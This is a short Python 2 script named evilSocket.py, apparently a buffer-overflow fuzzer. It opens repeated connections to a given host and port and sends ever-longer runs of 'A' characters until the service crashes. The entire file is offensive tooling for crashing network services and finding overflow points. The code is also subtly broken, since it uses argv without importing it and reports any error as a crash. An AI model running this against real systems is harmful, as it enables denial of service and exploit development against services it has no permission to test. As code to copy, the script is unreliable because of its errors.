#!/usr/bin/python
import socket
if len(argv) != 4:
	print "Usage: evilSocket.py [ip] [port] [bytes]"
	exit(0)
HOST = argv[1]
PORT = argv[2]
buffer = ["A"]
counter = int(argv[3])
while len(buffer) <= 40:
	buffer.append("A" * counter)
	counter = counter + 200
try:
	for string in buffer:
		print "[x] Throwing {} bytes at socket".format(len(string))
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((HOST, int(PORT)))
		s.recv(1024)
		s.send('{}\r\n'.format(string))
		s.recv(1024)
		s.send('QUIT\r\n')
		s.close()
except:
	print "[!] Crashed with {} bytes.".format(len(string))
